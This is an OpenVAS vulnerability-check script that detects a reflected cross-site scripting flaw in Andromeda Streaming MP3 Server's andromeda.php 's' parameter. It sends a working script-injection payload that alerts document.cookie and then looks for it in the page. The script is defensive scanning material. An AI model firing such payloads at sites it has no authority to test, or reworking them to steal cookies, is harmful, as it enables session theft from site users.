##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_andromeda_streaming_mp3_server_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Andromeda Streaming MP3 Server Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Andromeda Streaming MP3 Server version 1.9.3.6 PHP (2012) and prior";
tag_insight = "The flaw is due to an improper validation of user supplied input
  passed via 's' parameter to the 'andromeda.php' script, which allows
  attackers to execute arbitrary HTML and script code in the context of an
  affected application or site.";
tag_solution = "No solution or patch is available as of 14th May, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.turnstyle.com/andromeda/";
tag_summary = "This host is running Andromeda Streaming MP3 Server is prone to
  cross site scripting vulnerability.";

if(description)
{
  script_id(802777);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-14 13:55:03 +0530 (Mon, 14 May 2012)");
  script_name("Andromeda Streaming MP3 Server Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/18359");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/75497");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112549/ZSL-2012-5087.txt");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5087.php");

  script_description(desc);
  script_summary("Check if Andromeda Streaming MP3 Server is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
dir = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check host supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## List possible dirs
foreach dir (make_list("", "/music", "/andromeda", "/mp3", cgi_dirs()))
{
  url = dir + "/andromeda.php";

  ## Confirm the application
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
                    pattern:"<title>andromeda|powered by Andromeda",
                    extra_check:"Andromeda:"))
  {
    ## Construct attack
    url = url + '?q=s&s="><script>alert(document.cookie);</script>';

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
                       pattern:"><script>alert\(document.cookie\);</script>",
                       extra_check:"powered by Andromeda"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
